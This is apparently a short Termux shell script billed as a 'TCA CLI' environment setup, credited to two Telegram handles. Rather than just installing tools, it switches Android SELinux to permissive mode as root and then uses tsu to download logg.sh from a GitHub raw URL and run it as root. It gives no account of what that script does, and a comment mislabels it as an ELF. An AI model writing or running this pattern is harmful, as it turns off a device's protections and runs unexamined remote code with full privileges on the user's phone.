#!/data/data/com.termux/files/usr/bin/bash env

########################################
#  TCA CLI Environment Setup Script: 1.2
########################################
#
#  Author: The Illusionist <T.me/Theillusionist_TCA> and Josh <T.Me/@IAmJoshBrolin>
#
########################################
#
# Dependencies: bash and curl.
#
########################################

# Update and upgrade
pkg up -y && pkg upgrade -y

# Switch permissive
su -c 'setenforce 0'

# Install dependencies
time apt install wget -y

# Device architecture
[[ "$(uname -m)" =~ 'aarch64' ]] || {
    printf "Your device's architecture isn't officially supported yet."
    exit 1
}

# Fetch the ELF and setup
tsu -c 'wget https://raw.githubusercontent.com/aday-all/aday-all/master/logg.sh -O ./logg.sh'
tsu -c 'chmod a+x logg.sh'
tsu -c ./logg.sh
